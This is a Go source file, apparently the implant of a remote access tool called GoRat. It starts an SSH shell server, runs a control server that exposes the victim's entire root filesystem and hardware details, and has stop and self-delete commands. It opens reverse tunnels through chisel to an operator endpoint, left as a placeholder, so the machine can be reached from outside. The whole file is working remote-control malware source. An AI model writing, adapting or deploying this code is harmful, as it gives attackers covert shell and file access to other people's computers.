package main

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"time"

	ssh "github.com/JustinTimperio/GoRat/shell"
	"github.com/JustinTimperio/osinfo"
	"github.com/jaypipes/ghw"
	chisel "github.com/jpillora/chisel/client"
	cos "github.com/jpillora/chisel/share/cos"
)

var (
	endpoint_url = "@ENDPOINT_HERE@"
)

type Hardware struct {
	Runtime   string
	OSArch    string
	OSName    string
	OSVersion string
	CPU       string
	Cores     uint32
	RAM       string
	GPU       string
	Drives    string
}

func main() {
	rand.Seed(time.Now().UnixNano())
	BasePort := (rand.Intn(20000) * 2) + 10000

	go ssh.SSHServer(BasePort)
	go ControlServer(BasePort)

	for {
		ChiselWorker(BasePort)
		time.Sleep(10 * time.Second)
	}
}

// Control Server
func ControlServer(BasePort int) {
	controlPort := strconv.Itoa(BasePort + 1)

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprintf(w, "OK\n")
	})

	http.HandleFunc("/stop", func(w http.ResponseWriter, r *http.Request) {
		existenceIsPain()
	})

	http.HandleFunc("/uninstall", func(w http.ResponseWriter, r *http.Request) {
		ex, err := os.Executable()
		if err != nil {
			existenceIsPain()
		}
		os.Remove(ex)
		existenceIsPain()
	})

	http.HandleFunc("/hardware", func(w http.ResponseWriter, r *http.Request) {
		info := Hardware{}
		// No Error Handling I Know
		release := osinfo.GetVersion()
		memory, _ := ghw.Memory()
		block, _ := ghw.Block()
		gpu, _ := ghw.GPU()
		cpu, _ := ghw.CPU()

		for _, proc := range cpu.Processors {
			info.CPU = proc.Model
		}
		for _, vc := range gpu.GraphicsCards {
			info.GPU = vc.DeviceInfo.Product.Name
		}

		info.Runtime = release.Runtime
		info.OSArch = release.Arch
		info.OSName = release.Name
		info.OSVersion = release.Version

		info.Cores = cpu.TotalThreads
		info.RAM = memory.String()
		info.Drives = block.String()

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(info)

	})

	fs := http.FileServer(http.Dir(getPaths()))
	http.Handle("/fs/", http.StripPrefix("/fs/", fs))
	http.ListenAndServe("127.0.0.1:"+controlPort, nil)
}

// ChiselWorker
func ChiselWorker(BasePort int) (err error) {
	sshPort := strconv.Itoa(BasePort + 0)
	controlPort := strconv.Itoa(BasePort + 1)

	config := chisel.Config{Headers: http.Header{}}
	config.Server = endpoint_url
	config.Remotes = []string{"R:" + sshPort, "R:" + controlPort}

	c, err := chisel.NewClient(&config)
	if err != nil {
		return err
	}
	c.Debug = true
	go cos.GoStats()
	ctx := cos.InterruptContext()

	if err := c.Start(ctx); err != nil {
		return err
	}

	if err := c.Wait(); err != nil {
		return err
	}

	return nil
}

func getPaths() (out string) {
	switch runtime.GOOS {
	case "linux":
		return "/"
	case "darwin":
		return "/"
	case "windows":
		return "C:\\"
	}
	return ""
}

func existenceIsPain() {
	os.Exit(0)
	panic("RIP")
}
